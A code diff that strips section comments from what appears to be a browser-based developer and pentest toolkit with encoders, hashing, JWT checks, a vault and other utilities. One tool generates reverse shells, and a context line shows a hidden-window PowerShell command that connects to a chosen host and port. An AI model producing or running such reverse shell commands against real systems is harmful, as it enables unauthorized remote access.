@@ -2,7 +2,6 @@
 (function(){
 "use strict";
 
-// ---------- encoding ----------
 const enc = s => new TextEncoder().encode(s);
 const dec = b => new TextDecoder().decode(b);
 function b64enc(s){ let b=enc(s), x=''; for(const v of b) x+=String.fromCharCode(v); return btoa(x); }
@@ -28,8 +27,6 @@ function pemToBuf(pem){
   for(let i=0;i<bin.length;i++) b[i]=bin.charCodeAt(i);
   return b.buffer;
 }
-
-// ---------- MD5 ----------
 function md5(str){
   const bytes=enc(str), len=bytes.length, bitLen=len*8;
   const padLen=((56-(len+1)%64)+64)%64;
@@ -61,17 +58,12 @@ function md5(str){
   odv.setUint32(0,a0,true);odv.setUint32(4,b0,true);odv.setUint32(8,c0,true);odv.setUint32(12,d0,true);
   return [...out].map(v=>v.toString(16).padStart(2,'0')).join('');
 }
-
-// ---------- recents (per-tool I/O snapshot) ----------
 const RECENT_KEY = id => 'ds_recent_'+id;
 function saveRecent(id, obj){ try{ localStorage.setItem(RECENT_KEY(id), JSON.stringify(obj)); }catch(e){} }
 function loadRecent(id){ try{ return JSON.parse(localStorage.getItem(RECENT_KEY(id))||'null'); }catch(e){ return null; } }
-
-// ---------- tool registry ----------
 const TOOLS=[];
 function tool(def){ TOOLS.push(def); }
 function bindRecent(root, id, fields){
-  // fields: {el, key}
   const r = loadRecent(id);
   if (r) fields.forEach(f => { if (r[f.key] != null && f.el) f.el.value = r[f.key]; });
   function snap(){ const o={}; fields.forEach(f=>o[f.key]=f.el?f.el.value:''); saveRecent(id, o); }
@@ -79,9 +71,6 @@ function bindRecent(root, id, fields){
   return snap;
 }
 
-// =========================================================
-// 1. HTML → data URL / bookmarklet
-// =========================================================
 tool({
   id:'payload', name:'HTML → URL / Bookmark', tags:['data url','bookmarklet','html','studio','d-oul'],
   render(root){
@@ -139,9 +128,6 @@ tool({
   }
 });
 
-// =========================================================
-// 2. Encoders
-// =========================================================
 tool({
   id:'encode', name:'Encoders', tags:['base64','hex','url','encode','decode','rot13'],
   render(root){
@@ -175,9 +161,6 @@ tool({
   }
 });
 
-// =========================================================
-// 3. Hash
-// =========================================================
 tool({
   id:'hash', name:'Hash', tags:['hash','sha','md5','hmac'],
   render(root){
@@ -209,9 +192,6 @@ tool({
   }
 });
 
-// =========================================================
-// 4. JSON
-// =========================================================
 tool({
   id:'json', name:'JSON', tags:['json','format','minify','validate'],
   render(root){
@@ -228,9 +208,6 @@ tool({
   }
 });
 
-// =========================================================
-// 5. Regex tester
-// =========================================================
 tool({
   id:'regex', name:'Regex', tags:['regex','pattern','test'],
   render(root){
@@ -257,9 +234,6 @@ tool({
   }
 });
 
-// =========================================================
-// 6. Diff (line + char)
-// =========================================================
 tool({
   id:'diff', name:'Diff', tags:['diff','compare','text','char','line'],
   render(root){
@@ -285,7 +259,6 @@ tool({
       o.innerHTML=out.join('\n');
     }
     function charDiff(){
-      // LCS-lite: mark common prefix + common suffix, classify middle
       const A=a.value, B=b.value;
       let p=0; while(p<A.length && p<B.length && A[p]===B[p]) p++;
       let sa=A.length, sb=B.length;
@@ -303,9 +276,6 @@ tool({
   }
 });
 
-// =========================================================
-// 7. JWT (HS256 + RS256 verify)
-// =========================================================
 tool({
   id:'jwt', name:'JWT', tags:['jwt','token','auth','hs256','rs256'],
   render(root){
@@ -352,9 +322,6 @@ tool({
   }
 });
 
-// =========================================================
-// 8. URL / Query
-// =========================================================
 tool({
   id:'url', name:'URL', tags:['url','query','parse','encode'],
   render(root){
@@ -378,9 +345,6 @@ tool({
   }
 });
 
-// =========================================================
-// 9. Escape
-// =========================================================
 tool({
   id:'escape', name:'Escape', tags:['escape','json','js','c','shell','html','quote'],
   render(root){
@@ -406,9 +370,6 @@ tool({
   }
 });
 
-// =========================================================
-// 10. Bytes
-// =========================================================
 tool({
   id:'bytes', name:'Bytes', tags:['hex','bytes','shellcode','c','python','js'],
   render(root){
@@ -439,9 +400,6 @@ tool({
   }
 });
 
-// =========================================================
-// 11. Timestamp / number
-// =========================================================
 tool({
   id:'ts', name:'Timestamp', tags:['time','epoch','iso','date','base'],
   render(root){
@@ -470,9 +428,6 @@ tool({
   }
 });
 
-// =========================================================
-// 12. Reverse shell generator
-// =========================================================
 tool({
   id:'revshell', name:'Reverse Shell', tags:['shell','payload','pentest','bash','powershell'],
   render(root){
@@ -512,9 +467,6 @@ powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('${H}',${P});$
   }
 });
 
-// =========================================================
-// 13. Wordlist
-// =========================================================
 tool({
   id:'wordlist', name:'Wordlist', tags:['wordlist','fuzz','paths','subdomains'],
   render(root){
@@ -537,9 +489,6 @@ tool({
   }
 });
 
-// =========================================================
-// 14. HTTP template
-// =========================================================
 tool({
   id:'http', name:'HTTP Template', tags:['http','request','raw'],
   render(root){
@@ -558,9 +507,6 @@ tool({
   }
 });
 
-// =========================================================
-// 15. UUID
-// =========================================================
 tool({
   id:'uuid', name:'UUID', tags:['uuid','random','guid'],
   render(root){
@@ -572,9 +518,6 @@ tool({
   }
 });
 
-// =========================================================
-// 16. AES-GCM Vault (PBKDF2 600k iters)
-// =========================================================
 tool({
   id:'vault', name:'Vault', tags:['aes','encrypt','note','vault','pbkdf2','gcm'],
   render(root){
@@ -624,9 +567,6 @@ tool({
   }
 });
 
-// =========================================================
-// 17. Palette / recents / save-as-file
-// =========================================================
 tool({
   id:'about', name:'About / Recents', tags:['about','recents','settings'],
   render(root){
@@ -651,7 +591,6 @@ tool({
   }
 });
 
-// ---------- shell ----------
 document.addEventListener('DOMContentLoaded', () => {
   const nav=document.getElementById('tools');
   const pane=document.getElementById('pane');
@@ -676,7 +615,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const last=localStorage.getItem('ds_last');
   show(TOOLS.find(t=>t.id===last)||TOOLS[0]);
 
-  // PWA
   if ('serviceWorker' in navigator) {
     navigator.serviceWorker.register('./sw.js').catch(()=>{});
   }
